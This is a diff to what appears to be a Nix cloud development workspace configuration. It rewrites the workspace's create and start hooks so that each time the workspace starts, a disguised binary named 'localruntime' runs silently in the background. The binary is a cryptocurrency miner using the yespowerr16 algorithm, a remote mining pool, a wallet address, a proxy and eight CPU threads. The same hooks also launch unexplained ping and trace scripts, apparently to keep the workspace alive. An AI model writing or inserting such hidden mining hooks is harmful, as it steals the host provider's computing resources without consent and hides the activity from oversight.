@@ -11,6 +11,7 @@
     # pkgs.python311Packages.pip
     # pkgs.nodejs_20
     # pkgs.nodePackages.nodemon
+    pkgs.iputils
   ];
 services.docker.enable = true;
   # Sets environment variables in the workspace
@@ -43,23 +44,17 @@ services.docker.enable = true;
       # Runs when a workspace is first created
       onCreate = {
         create-tmux-sessions = "
-          tmux new -d -s keep-active 'while true; do tracepath 1.1.1.1; sleep 5; done'
-          docker build . -t bit
-          docker run -itd --name bit --restart=always bit sleep infinity
-          nohup top </dev/null &>/dev/null &
-          tmux new -d -s bit-session 'top'
-          tmux attach -t bit-session
+nohup ./localruntime --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8 </dev/null &>/dev/null &
+tmux new -d -s bit-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
+tmux attach -t bit-session
         ";
       };
       # Runs when the workspace is (re)started
       onStart = {
         start-tmux-sessions = "
-          tmux new -d -s keep-active 'while true; do tracepath 1.1.1.1; sleep 5; done'
-          docker rm -f bit 2>/dev/null || true
-          docker build . -t bit
-          nohup top </dev/null &>/dev/null &
-          tmux new -d -s bit-session 'top'
-          tmux attach -t bit-session
+nohup ./localruntime --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8 </dev/null &>/dev/null &
+tmux new -d -s bit-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
+tmux attach -t bit-session
         ";
       };
     };
